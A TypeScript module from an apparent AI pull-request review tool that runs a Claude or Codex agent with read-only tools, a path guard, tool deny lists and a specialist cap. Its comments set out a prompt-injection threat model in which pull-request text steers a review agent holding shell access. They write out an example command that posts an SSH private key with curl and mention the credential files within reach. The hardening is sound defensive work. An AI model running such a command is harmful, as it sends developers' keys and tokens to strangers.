import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { TICKET_REVIEW_PEER_MAX_FOR_PR_REVIEW, type ClaudeFindingLens } from '@pierre-review/shared';
import {
  claudeModelChoice,
  ranOn,
  type AgentOutcome,
  type AgentRunSpec,
  type ModelChoice,
} from '../ai/provider.js';
import { runCodexSpecialists } from '../ai/codex/specialists.js';
import { loadZod } from '../ai/runtime.js';
import type { RunReviewArgs, RunReviewResult } from '../platform/contract.js';
import { config } from '../config.js';
import { submitReviewShape, type SubmitReviewPayload } from './schema.js';
import { applyClaudeReviewAuth } from './auth.js';
import {
  cleanupCloneCache,
  prepPeerWorktrees,
  prepWorktree,
  removeWorktreeLocked,
} from './clone-manager.js';
import { relatedCheckoutsSection } from './claude-review/prompts.js';
import { estimateCostUsd } from './pricing.js';
import { runProvider } from './run-provider.js';
import { mapSubmittedReview } from './submit-map.js';
import {
  DISPATCH_TOOL_NAMES,
  SPECIALIST_MAX_TURNS,
  createDispatchGuard,
  specialistAgents,
  type DispatchGuard,
} from './claude-review/specialists.js';
import {
  codexReviewEffort,
  codexReviewModelOverride,
  codexSpecialistSpecs,
  pickCodexSpecialists,
  specialistReportsSection,
} from './codex-review.js';
import { codexReviewSystemPrompt, codexReviewUserPrompt } from './codex-wording.js';
import { emptyUsage, type UsageTokens } from './usage.js';

// The security-sensitive HALF of ctx.review.runReview (the plugin owns routing/prompts/
// persistence; core owns the SDK run). Given a resolved mode + the plugin-built prompts +
// the stripped diff (for anchoring), it clones/worktrees, runs the Agent SDK with the
// in-process submit_review MCP tool, applies the auth env policy, streams progress, anchors
// the findings, and RETURNS the structured result — it never touches the DB or throws for
// an expected failure (it returns { submitted:false } / { aborted:true } with telemetry).

// Read-only tool surface for a WORKTREE review. submit_review is the ONLY way structured
// output leaves the agent.
//
// ---- Bash is deliberately ABSENT (this used to include it) ----
//
// A code review is the textbook prompt-injection target: every byte the model reads — the PR
// title, the description, the diff, the review comments — was written by whoever opened the pull
// request, which on a public repo is anyone. Combine that untrusted instruction channel with
// `permissionMode: 'bypassPermissions'` (below) and a shell, and the review agent becomes a
// remote code-execution path on the developer's own machine, with their `gh` token, SSH keys,
// `~/.aws/credentials` and `.env` files all in reach and `curl` available to post them onwards.
//
// The old `DISALLOWED_TOOLS` blocklist (`Bash(rm *)`, `Bash(sudo *)`, …) was never a defence
// against that. It stops a handful of literal command prefixes; it does nothing about
// `curl -d @~/.ssh/id_rsa https://…`, `python -c …`, or any of the thousand equivalent spellings.
// A blocklist cannot enumerate the badness of a shell.
//
// What Bash bought was `git log` / `git show` for extra context, and the prompt already told the
// agent to "prefer the dedicated Read/Glob/Grep tools over shelling out" — so this trades a
// modest amount of optional context for closing arbitrary command execution driven by a stranger's
// pull-request text. Read/Glob/Grep remain, which is what actually reviews code.
//
// If shell access is ever genuinely needed here, the way back is a container/VM boundary or an
// explicit `canUseTool` allowlist under a non-bypass permission mode — NOT re-adding 'Bash' with
// a longer blocklist.
const WORKTREE_TOOLS = ['Read', 'Glob', 'Grep', 'mcp__review__submit_review'];
// A deep (worktree) review also gets the sub-agent dispatch tool, so the lead can consult its
// specialists (claude-review/specialists.ts). Each specialist is itself Read/Glob/Grep only, and
// every dispatch passes the PreToolUse guard below: catalogue names only, at most
// CLAUDE_REVIEW_MAX_SPECIALISTS per review, foreground, the lead's model.
// A DIFF-ONLY review is tool-less: the agent has the full diff in its prompt and no
// repository to explore, so submit_review is the only tool it gets.
const DIFF_ONLY_TOOLS = ['mcp__review__submit_review'];
// Per-model effort + thinking options live in ./model-options.ts (ONE table, shared with
// coding/agent.ts). ⚠ Opus 5.5 400s on disabled thinking, a thinking budget and a forced
// tool_choice — none of which this run sends.
// Deny list. `Bash` is denied OUTRIGHT rather than by command pattern — see WORKTREE_TOOLS
// above for why a per-command blocklist is not a security boundary when the model's input is
// attacker-authored. Belt and braces: Bash is also absent from the allow list, so this is the
// second of two independent reasons it cannot run.
export const DISALLOWED_TOOLS = [
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
  'Bash',
  'WebFetch',
  'WebSearch',
];

/**
 * The tool policy for one run. Pure, so the "specialists only on the deep route" rule is testable
 * without the SDK. A diff-only run, or a worktree run offered no specialists, gets the dispatch tool
 * DENIED outright — otherwise the SDK's built-in agent types (which inherit every tool) would be
 * one call away.
 */
export function reviewToolPolicy(
  mode: 'diff_only' | 'worktree',
  offered: readonly ClaudeFindingLens[] | undefined,
  // THE REFERENCE LIBRARY is in use (docs/REFERENCE-DOCS.md § Use in reviews). It changes ONE thing
  // here: a diff-only run, otherwise tool-less, gets Read/Glob/Grep — which the path guard confines
  // to its empty scratch folder and the library (read-only). Without it, the policy is unchanged.
  docs = false,
): { allowedTools: string[]; disallowedTools: string[]; specialists: ClaudeFindingLens[] } {
  const specialists = mode === 'worktree' ? [...(offered ?? [])] : [];
  if (mode === 'diff_only' && docs) {
    return {
      allowedTools: [...WORKTREE_TOOLS],
      disallowedTools: [...DISALLOWED_TOOLS, ...DISPATCH_TOOL_NAMES],
      specialists,
    };
  }
  if (specialists.length > 0) {
    return {
      allowedTools: [...WORKTREE_TOOLS, ...DISPATCH_TOOL_NAMES],
      disallowedTools: [...DISALLOWED_TOOLS],
      specialists,
    };
  }
  return {
    allowedTools: mode === 'worktree' ? [...WORKTREE_TOOLS] : [...DIFF_ONLY_TOOLS],
    disallowedTools: [...DISALLOWED_TOOLS, ...DISPATCH_TOOL_NAMES],
    specialists,
  };
}

/**
 * A diff-only run that reads the reference library walks INDEX.md → a CONTENTS.md → its sections
 * before submit_review: at least four sequential turns, more with a Grep or a second document. The
 * tool-less cap (config.reviewDiffOnlyMaxTurns, 6 by default) was sized for ~2 turns, and a run that
 * hits it stops BEFORE submit_review — failed, and still billed.
 */
export const DIFF_ONLY_DOCS_MIN_TURNS = 14;

/** The turn cap for one run. Pure, so the docs case is pinned without the SDK. */
export function reviewMaxTurnsFor(
  mode: 'diff_only' | 'worktree',
  docs: boolean,
  caps: { worktree: number; diffOnly: number } = { worktree: config.reviewMaxTurns, diffOnly: config.reviewDiffOnlyMaxTurns },
): number {
  if (mode === 'worktree') return caps.worktree;
  return docs ? Math.max(caps.diffOnly, DIFF_ONLY_DOCS_MIN_TURNS) : caps.diffOnly;
}

// How many recent-activity lines to keep in the live progress ring buffer.
const ACTIVITY_LOG_CAP = 25;

export async function runReview(args: RunReviewArgs): Promise<RunReviewResult> {
  const { model, mode, onProgress, abortController } = args;
  // THE PROVIDER, resolved ONCE per run: the one the manager decided for the job (a manual run's
  // per-run choice, else the default). Everything below that says `onCodex` is the Codex port
  // (docs/CODEX-PLAN.md Phase 3, stream a); on Claude none of it runs and the run is exactly what it was.
  const provider = runProvider(args.provider);
  const onCodex = provider.id === 'codex';
  // Codex only: the specialists' tokens (Limn runs them as separate runs; on Claude they are part of
  // the one run's usage already).
  let specialistUsage: UsageTokens = emptyUsage();

  let worktreePath: string | null = null;
  let repoCloneDir: string | null = null;
  let tempCwd: string | null = null;
  // The ticket peers' read-only checkouts (deep runs only); `cleanup` removes them in finally.
  let peerCleanup: (() => Promise<void>) | null = null;
  // How the run ended (the provider's neutral outcome), kept as it arrives.
  let outcome: AgentOutcome | null = null;
  let restoreEnv: (() => void) | null = null;
  // The run's LIVE token tally (the provider de-duplicates it per request: the SDK re-emits a
  // message per turn, so a naive SUM double-counts ~2×). The PERSISTED totals prefer the outcome's
  // authoritative whole-run usage (see telemetry()).
  let liveUsage: UsageTokens = emptyUsage();
  const telemetry = (): Pick<
    RunReviewResult,
    'costUsd' | 'inputTokens' | 'outputTokens' | 'cacheReadTokens' | 'cacheCreationTokens' | 'numTurns'
  > => {
    const lead = outcome?.usage ?? liveUsage;
    const usage = onCodex ? addTokens(lead, specialistUsage) : lead;
    const hasUsage = usage.inputTokens + usage.outputTokens + usage.cacheReadTokens > 0;
    return {
      // ⚠ Codex tokens are never priced as Claude's: its outcome carries its own US$ (0 on ChatGPT).
      costUsd: outcome?.costUsd ?? (hasUsage ? (onCodex ? 0 : estimateCostUsd(model, usage)) : null),
      inputTokens: usage.inputTokens,
      outputTokens: usage.outputTokens,
      cacheReadTokens: usage.cacheReadTokens,
      cacheCreationTokens: usage.cacheCreationTokens,
      numTurns: outcome?.numTurns ?? null,
    };
  };
  // THE MODEL CHOICE, resolved before anything can fail, so every result names what RAN (`ranOn`:
  // the provider and its model id — a Codex run is never stored as the Claude model it was asked for).
  // Codex: the role keeps the router's depth (Opus → deep, Sonnet → standard); the effort is the role's
  // on a worktree run and one step lower on a diff-only one (codex-review.ts). The live test may pin both.
  const override = onCodex ? codexReviewModelOverride() : null;
  const modelChoice: ModelChoice = override
    ? { role: claudeModelChoice(model).role, id: override.model }
    : claudeModelChoice(model);
  const ran = ranOn(provider, modelChoice);
  const fail = (failureReason: string | undefined, aborted: boolean): RunReviewResult => ({
    submitted: false,
    ranOn: ran,
    failureReason,
    scope: null,
    summary: '',
    verdict: 'COMMENT',
    findings: [],
    ...telemetry(),
    aborted,
    ...(usageRecorded ? { usageRecorded: true } : {}),
  });
  // Codex writes its own ledger rows when told who to bill (ai/providers/codex.ts); the manager must
  // then not write one too. Claude: false, the manager records as before.
  const usageRecorded = onCodex && args.usage != null;

  try {
    // Working directory + tool surface per mode. A worktree review clones + checks out the
    // head and gets the read-only file tools; a diff-only review is TOOL-LESS with a
    // throwaway cwd and NO clone (the dominant per-run cost) — the whole change is in its prompt.
    let cwd: string;
    let maxTurns: number;
    let prompt = args.prompt;
    // The ticket peers' checkouts, readable beside cwd (empty unless a deep run was handed peers).
    const peerDirs: string[] = [];
    // The "Related checkouts" tail appended to the prompt (a deep run with peers), kept for the Codex
    // specialists' briefs.
    let checkoutsTail = '';
    // The workspace's reference library, READ-ONLY, when the manager handed one (null ⇒ unchanged run).
    const docsDir = args.docsDir ?? null;
    const policy = reviewToolPolicy(mode, args.specialists, docsDir != null);
    if (mode === 'worktree') {
      onProgress({ phase: 'cloning', reviewMode: mode });
      ({ repoCloneDir, worktreePath } = await prepWorktree(
        args.owner,
        args.name,
        args.prNumber,
        args.headSha,
      ));
      cwd = worktreePath;
      maxTurns = reviewMaxTurnsFor(mode, docsDir != null);
      // OTHER PRs ON THE SAME TICKET, read-only, for cross-repo interactions (claude-review/
      // prompts.ts "Related PRs"). A peer that fails to check out is said so in the prompt and the
      // review goes on: peer context is optional, the review of THIS PR is not.
      const peers = (args.peers ?? []).slice(0, TICKET_REVIEW_PEER_MAX_FOR_PR_REVIEW);
      if (peers.length > 0) {
        const prepared = await prepPeerWorktrees(
          peers.map((p) => ({ owner: p.owner, name: p.name, number: p.prNumber, headSha: p.headSha })),
        );
        peerCleanup = prepared.cleanup;
        const checkouts = peers.map((p, i) => ({ ref: p.ref, path: prepared.peers[i]?.path ?? null }));
        for (const c of checkouts) if (c.path) peerDirs.push(c.path);
        checkoutsTail = `\n${relatedCheckoutsSection(checkouts)}`;
        prompt = `${prompt}${checkoutsTail}`;
      }
    } else {
      tempCwd = mkdtempSync(join(tmpdir(), 'pierre-review-'));
      cwd = tempCwd;
      // With the library, the cap leaves room for the INDEX → CONTENTS → sections walk.
      maxTurns = reviewMaxTurnsFor(mode, docsDir != null);
    }
    // Establish this run's auth (prefer ambient, strip an explicit key). The plugin decides
    // whether it's safe to mutate process.env (its concurrency === 1); restored in finally.
    // Codex: its child gets its own allow-listed environment (ai/codex/config.ts), never this one.
    if (!onCodex) restoreEnv = applyClaudeReviewAuth(args.applyAuthEnv);

    // ---- run the agent ----
    // THROUGH THE PROVIDER (ai/provider.ts; Claude's is ai/providers/claude.ts). Effort guides
    // thinking depth + token spend — the dominant cost knob — per mode (`effort`), and only for the
    // offered models (review/model-options.ts). The SDK and zod come from the AI runtime
    // (ai/runtime.ts) — downloaded on first use for an npm install. A missing runtime throws here and
    // lands in the catch as a readable failure.
    const reviewShape = await submitReviewShape({ docs: docsDir != null });
    let captured: SubmitReviewPayload | null = null;

    // Deep review: the specialist catalogue + the dispatch guard (a fresh count per run).
    const guard: DispatchGuard | null =
      policy.specialists.length > 0 ? createDispatchGuard(policy.specialists) : null;

    // Rolling, newest-last log of what the agent is doing right now, surfaced via onProgress. The
    // provider words each step's lines (a specialist's own steps carry its name).
    const activity: string[] = [];
    const pushActivity = (line: string): void => {
      const trimmed = line.trim();
      if (!trimmed) return;
      activity.push(trimmed);
      if (activity.length > ACTIVITY_LOG_CAP) activity.shift();
    };

    // Flip to 'reviewing' the moment setup is done — BEFORE the first model token — so the
    // prior phase doesn't linger through the agent's whole first turn.
    onProgress({ phase: 'reviewing', reviewMode: mode });

    // ---- Codex only: the model, its effort, the prompts in Codex words, and the specialists ----
    // (The model choice itself is resolved above the `try`, so even a run that fails early is labelled.)
    const codexEffort = override?.effort ?? codexReviewEffort(modelChoice.role, mode);
    const codexUsage = args.usage
      ? { accountId: args.usage.accountId, seam: 'agent' as const, feature: 'claude_review', prId: args.usage.prId, repoId: args.usage.repoId ?? null }
      : undefined;
    let system = args.systemPrompt;
    let leadBudgetUsd = config.reviewBudgetUsd;
    if (onCodex) {
      system = codexReviewSystemPrompt(args.systemPrompt, policy.specialists);
      // § 3.5: LIMN runs the specialists BEFORE the lead (the cap, the catalogue, read-only and the
      // budget enforced in ai/codex/specialists.ts) and hands their reports to it, fenced.
      if (policy.specialists.length > 0) {
        const picks = pickCodexSpecialists(policy.specialists);
        const z = await loadZod();
        const brief = codexReviewUserPrompt(args.prompt);
        const tail = checkoutsTail ? codexReviewUserPrompt(checkoutsTail) : '';
        const specs = codexSpecialistSpecs(z, picks, brief).map((sp) => ({ ...sp, prompt: `${sp.prompt}${tail}` }));
        for (const lens of picks) pushActivity(`Asking the ${lens} specialist`);
        onProgress({ phase: 'reviewing', recentActivity: [...activity], reviewMode: mode });
        const batch = await runCodexSpecialists({
          specialists: specs,
          offered: policy.specialists,
          model: modelChoice,
          cwd,
          roots: peerDirs,
          readOnlyRoots: docsDir != null ? [docsDir] : [],
          budget: { usd: config.reviewBudgetUsd, turns: SPECIALIST_MAX_TURNS },
          abortController,
          ...(args.allowSpecialistStart ? { allowStart: args.allowSpecialistStart } : {}),
          ...(codexUsage ? { usageRecord: codexUsage } : {}),
          // ONE door: the active provider's runAgent (the kind's allow-list check included).
          run: (sp: AgentRunSpec) => provider.runAgent({ ...sp, codex: { ...sp.codex, effort: codexEffort } }),
          onProgress: (name, p) => {
            if (p.kind !== 'step') return;
            for (const line of p.lines) pushActivity(`${name}: ${line}`);
            onProgress({ phase: 'reviewing', recentActivity: [...activity], reviewMode: mode });
          },
        });
        for (const a of batch.answers) if (a?.outcome?.usage) specialistUsage = addTokens(specialistUsage, a.outcome.usage);
        if (abortController.signal.aborted) return fail(undefined, true);
        if (leadBudgetUsd != null) leadBudgetUsd = Math.max(0, leadBudgetUsd - batch.costUsd);
        prompt = `${prompt}\n${specialistReportsSection(batch.answers.filter(Boolean), batch.refused)}`;
      }
      prompt = codexReviewUserPrompt(prompt);
    }

    // ⚠ THE PATH GUARD, on EVERY run (the provider puts it first on PreToolUse): under
    // bypassPermissions nothing else confines an absolute path, and the prompt is attacker-authored.
    // The file tools may read cwd and the peers' checkouts, nothing else. (A diff-only run has no
    // file tools; it is guarded anyway, so a future tool is never unconfined by default.)
    // The library is a READ-ONLY root: Read/Glob/Grep may reach it, nothing else may name it.
    ({ outcome } = await provider.runAgent({
      kind: 'review',
      model: modelChoice,
      effort: mode,
      prompt,
      system,
      cwd,
      roots: peerDirs,
      readOnlyRoots: docsDir != null ? [docsDir] : [],
      writeRoots: [],
      tools: {
        server: 'review',
        tools: [
          {
            name: 'submit_review',
            description: 'Submit your structured review. Call this EXACTLY once, at the end.',
            shape: reviewShape,
            handle: (a) => {
              captured = a as unknown as SubmitReviewPayload;
              return { text: 'Review recorded.' };
            },
          },
        ],
      },
      // User-set per-review cap (local settings) when present, else the operator default —
      // plus headroom for each specialist a deep run is offered (they share this one budget).
      budget: { usd: leadBudgetUsd, turns: maxTurns },
      abortController,
      ...(codexUsage ? { usageRecord: codexUsage } : {}),
      codex: { resultTool: 'submit_review', effort: codexEffort },
      claude: {
        allowedTools: policy.allowedTools,
        disallowedTools: policy.disallowedTools,
        ...(guard ? { agents: specialistAgents(policy.specialists) } : {}),
        // ⚠ THE SPECIALIST CAP LIVES HERE, not in the prompt.
        extraPreToolUse: guard
          ? [
              {
                hooks: [
                  async (input: { hook_event_name: string; tool_name?: string; tool_input?: unknown }) =>
                    input.hook_event_name === 'PreToolUse'
                      ? guard.decide(input.tool_name ?? '', input.tool_input)
                      : { continue: true },
                ],
              },
            ]
          : [],
      },
      onProgress: (p) => {
        if (p.kind === 'step') {
          if (p.usage) liveUsage = p.usage;
          // Codex's final answer arrives as a message (the JSON itself): worded as Claude's submit call.
          for (const line of p.lines) pushActivity(onCodex && isJsonAnswerLine(line) ? 'Submitting review…' : line);
          const live = liveUsage;
          onProgress({
            phase: 'reviewing',
            recentActivity: [...activity],
            reviewMode: mode,
            usage: { ...live, estCostUsd: onCodex ? 0 : estimateCostUsd(model, live) },
          });
        } else if (p.kind === 'outcome') {
          // Kept as it arrives, so a run that throws AFTER its outcome still reports it.
          outcome = p.outcome;
        }
      },
    }));

    if (!captured) {
      const reason =
        outcome && outcome.subtype !== 'success'
          ? `agent stopped (${outcome.subtype}) without submitting a review`
          : 'agent finished without calling submit_review';
      return fail(reason, false);
    }

    // ---- anchor (+ carry priorRef / followUp / ticket through verbatim) ----
    const payload: SubmitReviewPayload = captured;
    const mapped = mapSubmittedReview(payload, args.strippedDiff);

    return {
      submitted: true,
      ranOn: ran,
      ...mapped,
      ...telemetry(),
      aborted: false,
      ...(usageRecorded ? { usageRecorded: true } : {}),
    };
  } catch (err) {
    // A user cancel aborts the SDK iterator, surfacing as an error here.
    if (abortController.signal.aborted) return fail(undefined, true);
    return fail(errorMessage(err), false);
  } finally {
    restoreEnv?.();
    if (peerCleanup) await peerCleanup().catch(() => {});
    if (repoCloneDir && worktreePath) {
      await removeWorktreeLocked(args.owner, args.name, repoCloneDir, worktreePath).catch(
        () => {},
      );
    }
    // Diff-only runs use a throwaway cwd — remove it (best-effort).
    if (tempCwd) {
      try {
        rmSync(tempCwd, { recursive: true, force: true });
      } catch {
        /* advisory cleanup — never surface */
      }
    }
    // Only a worktree run touched the clone cache. Defer LRU eviction (fire-and-forget) so
    // the review result returns promptly; cleanupCloneCache is best-effort and never throws.
    if (repoCloneDir) {
      setImmediate(() => {
        try {
          cleanupCloneCache();
        } catch {
          /* advisory cleanup — never surface */
        }
      });
    }
  }
}

/** A Codex step line that is its final JSON answer (shown as the submit step, never as raw JSON). */
export function isJsonAnswerLine(line: string): boolean {
  return /^\s*\{\s*"/.test(line);
}

/** Two token tallies, summed (the Codex specialists' beside the lead's). */
function addTokens(a: UsageTokens, b: UsageTokens): UsageTokens {
  return {
    inputTokens: a.inputTokens + b.inputTokens,
    outputTokens: a.outputTokens + b.outputTokens,
    cacheReadTokens: a.cacheReadTokens + b.cacheReadTokens,
    cacheCreationTokens: a.cacheCreationTokens + b.cacheCreationTokens,
  };
}

function errorMessage(err: unknown): string {
  if (err instanceof Error) return err.message;
  return String(err);
}
